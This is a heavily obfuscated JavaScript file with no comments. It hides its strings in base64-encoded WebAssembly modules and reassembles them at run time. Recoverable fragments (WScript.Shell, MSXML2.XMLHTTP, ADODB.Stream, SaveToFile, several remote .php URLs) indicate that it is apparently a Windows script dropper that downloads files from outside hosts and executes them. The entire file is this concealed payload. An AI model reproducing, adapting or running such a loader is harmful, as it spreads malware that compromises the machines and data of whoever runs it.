const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGpICAgAAGfwBBAQt/AEGkBwt/AEGmDwt/AEHcFgt/AEHeFgt/AEHgFgsHuoCAgAAHBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFC4GXgIAABgBBAQuhB2ZjeHVzcG5vaWNtbnRobGlveG9nZG5yaSUyMHpyZGJ4bGl6KGxlZndrcnpnJTJDb3MlMjBtdGZ1aG5kdSUyQ3BhJTIwcHhybGVuZWUpaHElN0JuaCUyMHB0JTIweGd2aWphYXNyenUlMjBic3dueHN1eCUyMGpiJTNEa2klMjBuYm5xcWVtZ3dydiUyMGVuQWdwY2NmdHFhaWZjdmxxZXlwWHpvT2ltYnlranVlZW9nY2ltdG5zKGt0JTIyYndXeXVTd2hjbWFyZmRpeWZwdXh0dnQudnVTYmxoYWhlZHJscG9sYWglMjJoZillcCUzQmhoJTIwcGwlMjBqanZ0ZmFycXJvcyUyMHpwZm5obm1qJTIwcXUlM0R5byUyMGlvd21nc29sLnhiRXd1eGticGRtYXN2bnd0ZGFtRWJvbmJxdmRlaWJpcmNtb3Nlbmt2bWhpZXphbmxodGtrU2tmdG53cnlxaXdzbmd0Z2t1c2FiKHBtJTIybXIlMjVsb1RrZkVpbE15dFBoeSUyNXZ4JTIydWopaHMlMjB1cSUyQmJ3JTIwdGFTaWp0cmtydnZpeWRudWpncWEueXBmZGxybG9vbWZtY3dDY3NoYXFheXRyYWtDbnNvaGpkdWtlb3ooZWU5em0yc3cpamolMjB3diUyQnd0JTIwbnhmZmZuZ2wlM0JyeCUyMHpoJTIweGp2ZHVhZHNydHQlMjBkb3hob29ieSUyMHJiJTNEcW0lMjBrb25kaGVteXdneSUyMGhvQWVvY3dldHFzaXJmdndtZXFtWG9sT2dqYnp1am5xZXZ6Y3dzdGhmKGdqJTIyZGJNZmFTbnBYcWxNZ2tMYWEybHAuanBYeHRNY25MdXpIZnBUd3dUZWZQaW4lMjJ5ZSl4biUzQnp3JTIwdXolMjBoY3hzbW9oZi54Y296Y25ja3J2YmVtb2F2eWR1ZHlqY3NnZnRuamFua3RyY2V4dGN1Y2hjeGFsdW5neWdteWVlbCUyMGx5JTNEYm4lMjBocWZwdXVsaW5haGN5eHRicWlmcm94eG5mbiUyMGl0KGxzKW1mJTdCd2YlMjBkdyUyMHhnJTIwbXclMjBwc2lndWZreiUyMHJzKGd2eGxmb3BxLnVscm1oZWt5YWliZG92eWN1U3lydGd4YXVwdHZlZXVlJTIwZnolM0RmbiUzRGtkJTNEc2YlMjB4ejRuaSlxayU3QmtuJTIwYnQlMjBvdiUyMGYAAEGkBwuBCHUlMjBydiUyMG15JTIwenJ2eGFhZnlyeGklMjBwc3htdWF2byUyMGJzJTNEZXAlMjBxeW5nbGVzdXdrZSUyMGZlQWdqY3BpdGJkaXdmdm5iZW1jWHdnT2t3YndoamN2ZXFnY292dHp1KGZnJTIyY3lBYnhEcmhPb2REenpCc3UucnBTeGZ0YmVyZmhldGthYWhtYWglMjJpYylwbSUzQnBiJTIwc2IlMjB1YSUyMGFwJTIwa2glMjB1ZiUyMGt0eHRtYWdzLmJtb3dicG53ZXVkbmhzKHp0KWNvJTNCd2clMjBlbyUyMGttJTIwZmclMjBkdiUyMG11JTIwemN4cnNhbHAuemV0bGd5ZHNwbGpla20lMjBtdCUzRGx6JTIwenYxbmslM0J4aiUyMGhoJTIwdHMlMjBidCUyMGx1JTIwbGolMjBtd3h0Z2F3dS5yeXd6eXJrcWl3ZHRydmV6dChzcnhocG9ncy5mYVJtY2V1d3NkanBsbW9rcm5lc3Nib2VreEJoZG9leGR1YXl3Yil2aCUzQm5mJTIwY24lMjBvciUyMHV1JTIwemklMjBydCUyMGdteHltYWlhLmlvcHNnb2Fic2hiaXVwdHF0aXVob3FlbnVyJTIwdXMlM0R6eCUyMGNkMGNuJTNCeXclMjBqciUyMGtzJTIwbHglMjB3eiUyMHFpJTIwaXB4cW9hZ3YucXFzcW9hamZ2eGRlYWpUYmpva3JGbnFpcWZsaXRlbXEoeGNmZHpuZm0lMkNqdyUyMHRnMmlrKW1oJTNCdmQlMjB3eCUyMHpmJTIwd3klMjBvZSUyMHp0JTIwdWR4ZGVhanMudm9jbmFsenRvem9zZGNleW4oZ2spZGslM0JzYiUyMHVrJTIwcHglMjBwYiUyMGhnJTdEdmwlMjB1eiUyMGRmJTIwcGslMjB0ayUzQnFrJTIwbHElMjBrZyU3RGthJTIwd3glMjBpYyUzQmxwJTIwbXolMjBlZnRuaXJtZHlzZCUyMGpkJTdCdGIlMjBncSUyMHhlJTIwZWslMjB2Y3hudm90dy5pdG9rZHBibmVheW5xeShpeSUyMm9qR21mRXVzVGhoJTIydWYlMkN4aSUyMG91ZmJ4cm91JTJDemQlMjBzemZqb2FudWxtaHN6YWV6eSltYSUzQmRxJTIwY3ElMjByeCUyMGZmJTIwdHd4dm9vZWMubGNzYnRleXBuZmlkd2wodWEpZW0lM0JuaiUyMGlhJTIwcmwlMjBoeSUyMHl3aW5vZm50JTIwenMoZHJyZXVuYXQlMjBicCUzRXhuJTIwY20wemMpZ2glN0J5YyUyMGFrJTIwY3ElMjBpcCUyMGJnJTIwcmclMjAAAEGmDwu1B2Rhd2Fnc3pxLnZ3UndjdWJ5bm1iKGZ4ZmFvbmZuJTJDZ2clMjBwZDBqZSUyQ2dxJTIwY3kwc2opcXIlM0J4ZCUyMHN5JTIwaWglMjBwdyUyMHhyJTdEeXolMjBlciUyMHprJTIwYmMlMjBsdCUzQmFoJTIwbmMlMjBiYiU3RHpiJTIwcXYlMjBhc2Nya2FpcXRzY2NlemhydSUyMGdnKGF2ZXVxcnRiKW1xJTdCaXUlMjBvayUyMHR3JTdEdG8lMjBrciUyMGdjJTNCaWElN0R2c2R5aGxxbChoaCUyMmx5aHRqdG1mdGpqcGt4JTNBb3ElMkZsYyUyRmhiYmpraWJ4Z2t4YnZiYWVlZ2N3dHppcnVkZW56dmpoZWFlcnZjLmVuY3B4b2dlbXNwJTJGeHFpcG1tamJnZ2wlMkZrenNjdWNmb3Jka2ltanB2b3Rtbi5kZXB3b2hvbnB4cCUzRmFuaWhnYmFtZGdvMW5mLm5manpjcGhmZ2phJTIyaWUlMkNlZiUyMHVmJTIyanExa3kyam43bGs0ZnY5b2YwaXY1YW0ucmplbnR4dHVlZ2UlMjJteiUyQ2FpJTIwa2cxeWkpbGwlM0J2c2RieGx2cChnbSUyMnNvaG1udHF0dHJ3cGpzJTNBanclMkZjbyUyRm1qYnB4aW5yZ2F1YmtyYWR2Z3FydGNkcmVvZXNodm5xZWRrcnB1LmNhY3dpb3ZobWpjJTJGYnVpbWxteXBnZ2clMkZoaXNjdWNnYnJ6emlwa3BrY3RubC5qYnBzdGhnZHBrbCUzRmNmaWpjYmlwZHV2MnllLmlmamtocGhqZ3J1JTIyanclMkNmeSUyMHR2JTIyYXI0ZXYybmk3eHgzc3Iyb3QwYmQ1bGsubm5lZ214cGVlZmIlMjJmeSUyQ2F0JTIwd2Uxd3ApbnMlM0JvZ2Rxd2xndShmbyUyMnF1aHJidGFqdHpmcGJkJTNBcmwlMkZ6ZCUyRnFtYm56aWt1Z3d0YnhjYXVjZ3F2dGxhcm91ZXBmdmRpZWxzcmlpLnNkY3Bib3FvbXlrJTJGeG9pdnRtdGhnZnclMkZ4aHNuZGNvcnJ1a2lsYXBtenR0bC5udHBobmhsYnBlaiUzRmRzaWVvYmNjZG1lM2lhLnd3amh2cG5xZ3hrJTIyZGUlMkNzYSUyMHluJTIycXAyc2gzZGw1b280ZWs4aXg2aHY5ZGwuam5ldHV4eHhlamElMjJ4dCUyQ3NzJTIwdmwxYXopcHUlM0J6awAAQdwWCwEAAEHeFgsBAABB4BYLAQA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var qcwlc = lS(0, 0);
var qxic = lS(0, 1);
var igdm = lS(0, 2);
var gjjfixxf = qcwlc + qxic + igdm;
var jyqqtvzpa = lS(0, 3);
var psxyscsk = 3;
var edbfmjtp = gjjfixxf.split(lS(0, 4));
var svfmsezb = lS(0, 5);
(() => {
    i = 0;
    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
        env: {
            test: () => {
                return i < edbfmjtp.length ? 1 : 0;
            },
            update: () => {
                i += psxyscsk;
            },
            body: () => {
                {
                    jyqqtvzpa = jyqqtvzpa + edbfmjtp[i];
                }
            }
        }
    });
    const __exports = __forInstance0.exports;
    return __exports.data();
})();
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                print(jyqqtvzpa);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();